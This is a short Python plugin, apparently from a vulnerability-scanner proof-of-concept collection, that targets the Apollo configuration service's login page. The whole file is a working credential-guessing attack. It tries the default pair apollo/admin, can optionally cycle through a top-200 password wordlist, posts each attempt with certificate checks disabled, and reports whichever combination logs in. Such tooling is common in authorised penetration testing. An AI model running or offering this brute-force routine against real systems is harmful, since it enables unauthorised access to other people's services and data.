# coding: utf-8
# @Time    : 2020/9/21 6:29
# @Author    : WANSUIYE
# @File    : ApolloCheck.py
# @Project: kscan_pocs

import requests

from .utils.getFile import get_var_items,genUserPasswd

def get_dict(flag=1):
	if flag==1:
		user_list=['apollo']
		passwd_list=['admin']
	else:
		user_list = get_var_items('ssh_user.txt')
		user_list.add('apollo')
		passwd_list = get_var_items('top200passwd.txt')
		passwd_list.add('admin')

	return genUserPasswd(user_list, passwd_list)

def bf(target,user,passwd,timeout):
	url = '{}://{}:{}/signin'.format(target[0], target[1], int(target[2]))
	retVal=''
	try:
		data = {"username": user, "password": passwd}
		res = requests.post(url, data=data, verify=False, timeout=timeout)
		if res.status_code ==200 and 'signin' not in res.url:
			retVal = '{}/{}'.format(user,passwd)
	except:
		pass
	return retVal

def check(target,**kwargs):
	timeout = kwargs.get('timeout') or 3
	flag = kwargs.get('flag') or 1
	retVal={'service':'Apollo','status':1,'url':''}

	for user, passwd in get_dict(flag):
		res = bf(target,user,passwd,timeout)
		if res:
			retVal['status'] = 2
			retVal['url'] += res+'\n'

	return retVal
